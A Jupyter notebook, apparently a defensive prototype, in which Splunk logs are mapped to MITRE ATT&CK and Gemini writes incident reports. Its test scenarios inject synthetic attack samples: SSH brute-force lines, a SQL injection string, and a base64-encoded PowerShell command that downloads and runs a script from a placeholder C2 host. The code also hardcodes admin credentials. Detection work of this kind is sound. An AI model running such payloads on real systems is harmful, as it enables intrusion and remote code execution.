{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b66a6a9b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "import chromadb\n",
    "import google.generativeai as genai\n",
    "from stix2 import MemoryStore, Filter, AttackPattern # Import STIX2 components\n",
    "from dotenv import load_dotenv\n",
    "load_dotenv(\"app.env\")\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"localhost\")\n",
    "SPLUNK_PORT = os.environ.get(\"SPLUNK_PORT\", 8000)\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\")\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set.\")\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "\n",
    "# ChromaDB setup\n",
    "CHROMA_DB_PATH = \"./chroma_db\" # Path for persistent storage\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "402e7de2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Checking/Populating Security Knowledge Base with MITRE ATT&CK ---\n",
      "MITRE ATT&CK data already present in knowledge base (823 techniques found). Skipping initial population.\n",
      "Sample security knowledge appears to be present. Skipping population.\n",
      "\n",
      "Total unique documents in knowledge base: 826\n",
      "\n",
      "\n",
      "=== Running Scenario 1: Brute Force & Web Attack (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query: \n",
      "    search index=main (sourcetype=sshd OR sourcetype=access_combined) earliest=-15m | table _time, host, source, _raw\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:30:00\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\"]\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:30:05\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\"]\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:30:10\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\"]\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:30:15\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\"]\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:30:20\", host=\"webserver-01\", source=\"/var/log/apache2/access.log\", _raw=\"192.168.1.10 - - [24/May/2024:09:30:20 +0000] \"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\" 404 200 \"-\" \"Mozilla/5.0\"\"]\n",
      "    | sort _time\n",
      "     ---\n",
      "Attempting to connect to Splunk at 127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "Retrieving data from Splunk...\n",
      "Splunk search job failed: {'info': ['Your timerange was substituted based on your search string']}\n",
      "No relevant Splunk logs found for the given query.\n",
      "No relevant Splunk logs found to generate a report.\n",
      "\n",
      "\n",
      "=== Running Scenario 2: PowerShell Anomaly (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query: \n",
      "    search index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104 (Commandline=\"*powershell.exe -enc*\" OR Commandline=\"*IEX*\") earliest=-1h | table _time, host, EventCode, Commandline\n",
      "    | append [| makeresults | eval _time=\"2024-05-24 09:40:00\", host=\"endpoint-05\", EventCode=\"4104\", Commandline=\"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZgBhAGsAZQBkAG8AbwBtAGEAaW4ALwBwAGEAYQB5AGwAbwBhAGQALgBwAHMAMAAiACkAKQAKAA==\"]\n",
      "    | sort _time\n",
      "     ---\n",
      "Attempting to connect to Splunk at 127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "Retrieving data from Splunk...\n",
      "Splunk search job failed: {'info': ['Your timerange was substituted based on your search string']}\n",
      "No relevant Splunk logs found for the given query.\n",
      "No relevant Splunk logs found to generate a report.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "import chromadb\n",
    "import google.generativeai as genai\n",
    "from stix2 import MemoryStore, Filter, AttackPattern # Import STIX2 components\n",
    "from dotenv import load_dotenv\n",
    "load_dotenv(\"app.env\")\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"localhost\")\n",
    "SPLUNK_PORT = os.environ.get(\"SPLUNK_PORT\", 8089)\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\")\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "\n",
    "# Ensure API key is set\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set.\")\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "\n",
    "# ChromaDB setup\n",
    "CHROMA_DB_PATH = \"./chroma_db\" # Path for persistent storage\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# --- Helper Functions ---\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    print(f\"Attempting to connect to Splunk at {SPLUNK_HOST}:{8089}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=\"127.0.0.1\",\n",
    "            port=\"8089\",\n",
    "            username=\"admin\",\n",
    "            password=\"admin123\",\n",
    "            scheme=\"https\", # Use http for the management port 8089 if not configured for https\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"Runs a Splunk search query and returns results.\"\"\"\n",
    "    try:\n",
    "        kwargs = {\"earliest_time\": earliest_time, \"latest_time\": latest_time, \"output_mode\": output_mode}\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "        while not job.is_ready():\n",
    "            pass\n",
    "        if job.is_done():\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel()\n",
    "            return events\n",
    "        else:\n",
    "            print(f\"Splunk search job failed: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "\n",
    "def get_embedding(text):\n",
    "    \"\"\"Generates an embedding for a given text using Gemini.\"\"\"\n",
    "    try:\n",
    "        # Option 1: Use the module-level embedding function (recommended for simplicity)\n",
    "        # Make sure the genai.configure(api_key=GEMINI_API_KEY) has been called globally\n",
    "        response = genai.embed_content(model='embedding-001', content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "\n",
    "        # Option 2: If you prefer to stick to object-oriented (though not strictly necessary here)\n",
    "        # model = genai.GenerativeModel('embedding-001') # This line is correct for instantiating the model\n",
    "        # response = model.embed_content(content=text, task_type=\"RETRIEVAL_DOCUMENT\") # This is incorrect for GenerativeModel\n",
    "\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding: {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=\"enterprise-attack.json\"):\n",
    "    \"\"\"\n",
    "    Loads MITRE ATT&CK data from a STIX JSON file and prepares it for the vector store.\n",
    "    Download from: https://attack.mitre.org/resources/attack-data-and-tools/ (look for STIX 2.x)\n",
    "    \"\"\"\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "\n",
    "        attack_data_points = []\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "\n",
    "        for tech in techniques:\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            external_ids = [ext_ref['external_id'] for ext_ref in tech.external_references if 'external_id' in ext_ref and ext_ref.get('source_name') == 'mitre-attack']\n",
    "            mitre_id = next((id for id in external_ids if id.startswith('T')), None)\n",
    "\n",
    "            if not mitre_id: # Skip if no clear MITRE ID (e.g., if it's a deprecated object or not a standard technique)\n",
    "                continue\n",
    "\n",
    "            tactics_names = []\n",
    "            # Find associated tactics using relationships\n",
    "            for relationship in stix_store.query(Filter(\"source_ref\", \"=\", tech.id), Filter(\"relationship_type\", \"=\", \"uses\")):\n",
    "                # Ensure the target of the relationship is a tactic object\n",
    "                tactic_obj = stix_store.query(Filter(\"id\", \"=\", relationship.target_ref))\n",
    "                if tactic_obj and tactic_obj[0].type == 'tactic':\n",
    "                    tactics_names.append(tactic_obj[0].name)\n",
    "\n",
    "            # Construct the text for embedding. Make it rich enough for Gemini to understand.\n",
    "            full_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {', '.join(tactics_names) if tactics_names else 'N/A'}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "\n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id, # Use MITRE ID as the unique ID for easier mapping\n",
    "                \"text\": full_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_names,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path # Useful for debugging\n",
    "                }\n",
    "            })\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        return attack_data_points\n",
    "\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at {stix_json_path}\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge.\"\"\"\n",
    "    # Fetch existing IDs to avoid re-adding\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result['ids'])\n",
    "    \n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            # Generate a stable ID if not provided, e.g., for ad-hoc knowledge\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "\n",
    "        if unique_id in existing_ids:\n",
    "            continue # Skip if already exists\n",
    "\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding:\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Failed to generate embedding for: {dp['text'][:50]}...\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        security_collection.add(\n",
    "            documents=docs_to_add,\n",
    "            embeddings=embeddings_to_add,\n",
    "            metadatas=metadatas_to_add,\n",
    "            ids=ids_to_add\n",
    "        )\n",
    "        print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "    else:\n",
    "        print(\"No new documents to add to the vector store.\")\n",
    "\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    \"\"\"\n",
    "    Searches the vector store for relevant documents.\n",
    "    Args:\n",
    "        query_text (str): The text to query with.\n",
    "        n_results (int): Number of results to retrieve.\n",
    "        filter_metadata (dict): Optional. A dictionary of metadata to filter results (e.g., {\"type\": \"mitre_attack_technique\"}).\n",
    "    Returns:\n",
    "        dict: Search results including documents, distances, and metadatas.\n",
    "    \"\"\"\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata # Apply metadata filter here\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    \"\"\"\n",
    "    Generates an incident report using Gemini based on Splunk logs, retrieved knowledge, and MITRE mappings.\n",
    "    \"\"\"\n",
    "    model = genai.GenerativeModel('gemini-pro')\n",
    "\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name')} ({mapping.get('technique_id')})\\n\"\n",
    "            if mapping.get('tactics'):\n",
    "                mitre_details_str += f\"  **Tactics:** {', '.join(mapping['tactics'])}\\n\"\n",
    "            # It's better to pass the full description to the LLM and let it summarize if needed.\n",
    "            # But for the report, show a snippet or the full if it's concise.\n",
    "            mitre_details_str += f\"  **Description:** {mapping['description'][:200]}...\\n\" # Shorten description for display\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score'):.2f}\\n\"\n",
    "\n",
    "    prompt = f\"\"\"\n",
    "    You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, relevant security knowledge, and potential MITRE ATT&CK mappings.\n",
    "\n",
    "    ---\n",
    "    **Splunk Logs (Raw Data for Context):**\n",
    "    {splunk_logs}\n",
    "\n",
    "    ---\n",
    "    **Relevant Security Knowledge (from Vector Store):**\n",
    "    {relevant_knowledge if relevant_knowledge else \"No specific relevant security knowledge found.\"}\n",
    "\n",
    "    ---\n",
    "    **Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "    {mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "    ---\n",
    "    **Incident Summary (if provided):**\n",
    "    {incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "    ---\n",
    "    **Instructions for Report Generation:**\n",
    "    1.  **Incident Title:** Create a clear and descriptive title.\n",
    "    2.  **Date/Time of Detection:** Extract from logs. Provide a range if multiple times.\n",
    "    3.  **Affected Systems/Users:** Identify from logs.\n",
    "    4.  **Description of Incident:** Summarize the events chronologically and explain what happened. **Crucially, integrate and explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques.**\n",
    "    5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified. Prioritize based on the provided mappings and your understanding of the logs.\n",
    "    6.  **Impact:** Briefly describe potential impact (e.g., data breach, service disruption, account compromise).\n",
    "    7.  **Recommended Actions/Remediation:** Based on relevant knowledge (playbooks) and log analysis, suggest immediate and long-term actions.\n",
    "    8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "    9.  **Analyst Notes:** Any other observations, open questions, or next steps.\n",
    "\n",
    "    Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "    \"\"\"\n",
    "\n",
    "    try:\n",
    "        response = model.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    \"\"\"\n",
    "    Main function to orchestrate the AI SOC analyst assistant workflow.\n",
    "    Args:\n",
    "        splunk_query (str): The Splunk search query to run.\n",
    "        incident_summary (str): Optional summary of the incident for context.\n",
    "        distance_threshold (float): Max similarity distance to consider a MITRE mapping relevant.\n",
    "                                    Lower values mean higher similarity. Tune this!\n",
    "    Returns:\n",
    "        str: The generated incident report.\n",
    "    \"\"\"\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query: {splunk_query} ---\")\n",
    "\n",
    "    # 1. Connect to Splunk\n",
    "    splunk_service = connect_to_splunk()\n",
    "    if not splunk_service:\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "\n",
    "    # 2. Retrieve relevant data from Splunk\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query, earliest_time=\"-24h\", latest_time=\"now\")\n",
    "\n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "        return \"No relevant Splunk logs found to generate a report.\"\n",
    "\n",
    "    # Convert list of dictionaries to a more readable string for the LLM\n",
    "    formatted_splunk_logs = \"\\n\".join([str(event) for event in raw_splunk_events])\n",
    "\n",
    "    # 3. Search Vector Store for relevant general security knowledge\n",
    "    print(\"Searching vector store for relevant general security knowledge...\")\n",
    "    # Query for general security knowledge (playbooks, past incidents, policies, assets)\n",
    "    # Exclude mitre_attack_technique type here to avoid redundancy and focus this query\n",
    "    general_knowledge_query = f\"Based on these security logs, what are relevant security playbooks, past incidents, or policies? Logs: {formatted_splunk_logs}\"\n",
    "    general_knowledge_results = search_security_knowledge_base(\n",
    "        general_knowledge_query,\n",
    "        n_results=3,\n",
    "        filter_metadata={\"type\": {\"$ne\": \"mitre_attack_technique\"}} # Exclude MITRE techniques here\n",
    "    )\n",
    "\n",
    "    relevant_knowledge_str = \"\"\n",
    "    if general_knowledge_results and general_knowledge_results['documents']:\n",
    "        print(\"Found relevant general knowledge:\")\n",
    "        for i, doc in enumerate(general_knowledge_results['documents'][0]):\n",
    "            relevant_knowledge_str += f\"* **Source:** {general_knowledge_results['metadatas'][0][i].get('type', 'N/A')} ({general_knowledge_results['metadatas'][0][i].get('incident_type', '')})\\n\"\n",
    "            relevant_knowledge_str += f\"    **Content:** {doc}\\n\\n\"\n",
    "    else:\n",
    "        print(\"No specific relevant general knowledge found in vector store.\")\n",
    "\n",
    "    # 4. Search Vector Store specifically for MITRE ATT&CK techniques\n",
    "    print(\"Searching vector store for potential MITRE ATT&CK mappings...\")\n",
    "    # Formulate a query that describes the *behavior* you want to map\n",
    "    mitre_mapping_query = f\"Analyze the following security events and identify potential MITRE ATT&CK tactics and techniques: {formatted_splunk_logs}\"\n",
    "    mitre_mapping_results = search_security_knowledge_base(\n",
    "        mitre_mapping_query,\n",
    "        n_results=10, # Get more results to ensure comprehensive check\n",
    "        filter_metadata={\"type\": \"mitre_attack_technique\"} # Explicitly filter for ATT&CK techniques\n",
    "    )\n",
    "\n",
    "    identified_mitre_mappings = []\n",
    "    if mitre_mapping_results and mitre_mapping_results['documents']:\n",
    "        print(\"Found potential MITRE ATT&CK mappings:\")\n",
    "        for i, doc_content in enumerate(mitre_mapping_results['documents'][0]):\n",
    "            metadata = mitre_mapping_results['metadatas'][0][i]\n",
    "            distance = mitre_mapping_results['distances'][0][i]\n",
    "            if distance < distance_threshold: # Apply confidence threshold\n",
    "                identified_mitre_mappings.append({\n",
    "                    \"technique_name\": metadata.get('technique_name'),\n",
    "                    \"technique_id\": metadata.get('technique_id'),\n",
    "                    \"tactics\": metadata.get('tactics'),\n",
    "                    \"description\": doc_content, # Pass the full description for Gemini to reference\n",
    "                    \"distance_score\": distance\n",
    "                })\n",
    "        # Sort by distance (lower distance means higher similarity/relevance)\n",
    "        identified_mitre_mappings.sort(key=lambda x: x['distance_score'])\n",
    "        # Optionally, limit to top N results after sorting and filtering\n",
    "        identified_mitre_mappings = identified_mitre_mappings[:5] # Limit to top 5 most relevant\n",
    "\n",
    "        for mapping in identified_mitre_mappings:\n",
    "            print(f\"  - {mapping['technique_id']}: {mapping['technique_name']} (Score: {mapping['distance_score']:.2f})\")\n",
    "    else:\n",
    "        print(\"No relevant MITRE ATT&CK techniques found within the threshold.\")\n",
    "\n",
    "    # 5. Generate Incident Report using Gemini\n",
    "    print(\"Generating incident report with Gemini...\")\n",
    "    incident_report = generate_incident_report(\n",
    "        formatted_splunk_logs,\n",
    "        relevant_knowledge_str,\n",
    "        identified_mitre_mappings,\n",
    "        incident_summary\n",
    "    )\n",
    "\n",
    "    print(\"\\n--- AI SOC Analyst Assistant Completed ---\")\n",
    "    return incident_report\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    # --- Initial population of vector store with MITRE data ---\n",
    "    print(\"--- Checking/Populating Security Knowledge Base with MITRE ATT&CK ---\")\n",
    "\n",
    "    # 1. First, get the total count of documents in the collection\n",
    "    total_docs_in_db = security_collection.count()\n",
    "\n",
    "    # 2. Determine if MITRE data needs to be loaded\n",
    "    needs_mitre_population = False\n",
    "    \n",
    "    if total_docs_in_db == 0:\n",
    "        # If the collection is completely empty, it definitely needs MITRE data\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. MITRE ATT&CK data needs to be populated.\")\n",
    "    else:\n",
    "        # If the collection is not empty, check specifically for MITRE data\n",
    "        try:\n",
    "            # Use .get() with the 'where' clause to retrieve items matching the filter,\n",
    "            # include=[] to get only IDs for efficiency.\n",
    "            mitre_techniques_in_db = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])\n",
    "            if len(mitre_techniques_in_db['ids']) == 0:\n",
    "                # Other documents exist, but no MITRE techniques\n",
    "                needs_mitre_population = True\n",
    "                print(\"Other documents found, but MITRE ATT&CK data is not present in knowledge base. Populating now...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data already present in knowledge base ({len(mitre_techniques_in_db['ids'])} techniques found). Skipping initial population.\")\n",
    "        except Exception as e:\n",
    "            # Catch potential errors from .get() if the collection state is tricky\n",
    "            print(f\"Warning: Error checking for existing MITRE data with .get(): {e}\")\n",
    "            print(\"Assuming MITRE data needs population to be safe.\")\n",
    "            needs_mitre_population = True\n",
    "\n",
    "\n",
    "    # 3. Perform population if needed\n",
    "    if needs_mitre_population:\n",
    "        mitre_data_points = load_mitre_attack_data(stix_json_path=\"enterprise-attack.json\")\n",
    "        if mitre_data_points:\n",
    "            populate_security_knowledge_base(mitre_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. Mapping might be less effective.\")\n",
    "    \n",
    "    # --- Add other general security knowledge (if not already added) ---\n",
    "    # Simplified check for sample data to avoid re-adding if it seems present\n",
    "    # A more robust solution for persistent knowledge would involve checking specific IDs of sample_security_knowledge\n",
    "    \n",
    "    # Check if a known ID from sample_security_knowledge exists\n",
    "    sample_data_present = False\n",
    "    try:\n",
    "        # Try to get one of the sample data points by its ID\n",
    "        if security_collection.get(ids=[\"playbook_phishing_response\"], include=[])['ids']:\n",
    "            sample_data_present = True\n",
    "    except Exception as e:\n",
    "        # Handle cases where .get() fails (e.g., empty collection after a full reset)\n",
    "        print(f\"Warning: Error checking for sample data: {e}. Will attempt to add.\")\n",
    "        sample_data_present = False # Assume it's not present if checking fails\n",
    "\n",
    "    if not sample_data_present:\n",
    "        print(\"Sample security knowledge not fully present. Populating now...\")\n",
    "        sample_security_knowledge = [\n",
    "            {\"id\": \"playbook_phishing_response\", \"text\": \"Playbook: Phishing Incident Response. Trigger: User reports suspicious email or email gateway alert. Steps: 1. Verify email authenticity (headers, sender reputation). 2. Check for malicious attachments/links (sandbox). 3. If malicious, remove email from all affected inboxes. 4. Reset user password if credentials compromised. 5. Educate user. 6. Block malicious sender/domains at firewall/proxy. 7. Log and document. Severity: Medium to High depending on compromise.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"phishing\"}},\n",
    "            {\"id\": \"playbook_malware_containment\", \"text\": \"Playbook: Malware Containment and Eradication. Trigger: EDR alert, antivirus detection, or user report of suspicious activity. Steps: 1. Isolate infected host(s) from network immediately. 2. Collect forensic data (memory dump, process list). 3. Run full endpoint scan. 4. Identify persistence mechanisms (registry, scheduled tasks, services). 5. Remove malware and persistence. 6. Restore affected files from clean backup. 7. Update security definitions. Severity: High.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"malware\"}},\n",
    "            {\"id\": \"inc_003_unauth_db_access\", \"text\": \"Past Incident: Incident ID INC-2024-003. Type: Unauthorized Access - Database. Date: 2024-05-10. Affected: Customer Database (MySQL). Attack Vector: Brute force via SSH followed by database privilege escalation. Description: Numerous failed SSH logins from external IP, then successful login to 'admin' account, followed by `SELECT * FROM users;` queries. Containment: Blocked source IP at firewall, disabled compromised admin account, rotated DB credentials. Impact: Potential exfiltration of customer PII. Lessons Learned: Implement MFA for all admin accounts, stronger password policies. MITRE ATT&CK T1078 (Valid Accounts), T1110 (Brute Force).\", \"metadata\": {\"type\": \"past_incident\", \"incident_type\": \"unauthorized_access\", \"mitre_id\": \"T1078, T1110\"}},\n",
    "        ]\n",
    "        populate_security_knowledge_base(sample_security_knowledge)\n",
    "    else:\n",
    "        print(\"Sample security knowledge appears to be present. Skipping population.\")\n",
    "\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run scenarios with improved MITRE mapping ---\n",
    "    print(\"\\n\\n=== Running Scenario 1: Brute Force & Web Attack (with MITRE Mapping) ===\")\n",
    "    splunk_query_example = \"\"\"\n",
    "    search index=main (sourcetype=sshd OR sourcetype=access_combined) earliest=-15m | table _time, host, source, _raw\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:30:00\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\"]\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:30:05\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\"]\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:30:10\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\"]\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:30:15\", host=\"webserver-01\", source=\"/var/log/auth.log\", _raw=\"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\"]\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:30:20\", host=\"webserver-01\", source=\"/var/log/apache2/access.log\", _raw=\"192.168.1.10 - - [24/May/2024:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\"]\n",
    "    | sort _time\n",
    "    \"\"\"\n",
    "    report_1 = ai_soc_analyst_assistant(splunk_query_example, incident_summary=\"Multiple failed SSH login attempts followed by a successful login and an attempted SQL Injection on a web server.\")\n",
    "    print(report_1)\n",
    "\n",
    "    print(\"\\n\\n=== Running Scenario 2: PowerShell Anomaly (with MITRE Mapping) ===\")\n",
    "    splunk_query_powershell = \"\"\"\n",
    "    search index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104 (Commandline=\"*powershell.exe -enc*\" OR Commandline=\"*IEX*\") earliest=-1h | table _time, host, EventCode, Commandline\n",
    "    | append [| makeresults | eval _time=\"2024-05-24 09:40:00\", host=\"endpoint-05\", EventCode=\"4104\", Commandline=\"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHMAOgAvAC8AYwAyAC4AZgBhAGsAZQBkAG8AbwBtAGEAaW4ALwBwAGEAYQB5AGwAbwBhAGQALgBwAHMAMAAiACkAKQAKAA==\"]\n",
    "    | sort _time\n",
    "    \"\"\"\n",
